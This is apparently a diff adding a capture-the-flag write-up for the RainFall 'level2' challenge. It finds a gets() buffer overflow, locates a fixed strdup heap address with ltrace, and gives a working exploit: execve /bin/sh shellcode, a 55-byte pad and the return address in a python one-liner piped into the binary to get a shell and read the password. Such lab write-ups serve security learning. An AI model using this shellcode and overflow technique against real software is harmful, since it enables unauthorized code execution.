@@ -1,3 +1,42 @@
 level 2
 
-We have 
+We have an executable ./level2 that wait for an input and print input
+
+Lets debug with gdb:
+
+info functions gives us two function main() and p()
+main function calls the p function
+p function uses gets so its vulnerable to overflow but we cant see any type of shell calls like levels before in the other hand we have an strdup call so if we manage to know the returned address from malloc we can put an shell code in it and overwrite the eip register with that address
+after many tries using ltrace we found out that the returned address from malloc is the same:
+
+level2@RainFall:~$ ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff7c4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                                                                                                        = 0
+gets(0xbffff6cc, 0, 0, 0xb7e5ec73, 0x80482b5aaa
+)                                                                                             = 0xbffff6cc
+puts("aaa"aaa
+)                                                                                                                               = 4
+strdup("aaa")                                                                                                                             = 0x0804a008
++++ exited (status 8) +++
+level2@RainFall:~$
+
+so the adress is 0x0804a008 =little endian> \x08\xa0\x04\x08
+First thing we need to find a shellcode
+
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+this is 25 bytes shellcode 
+
+Second thing we need to know at which byte the program arrives to eip register 
+using patern generator we found that eip offset is 80
+
+so the padding will be 55 bytes
+
+the exploit will be somthing like this :
+
+python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * 55 + '\x08\xa0\x04\x08')" | ./level2
+
+we need just hang the shell like the level before 
+
+(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * 55 + '\x08\xa0\x04\x08')";cat) | ./level2
+
+It works we can now cat the .pass
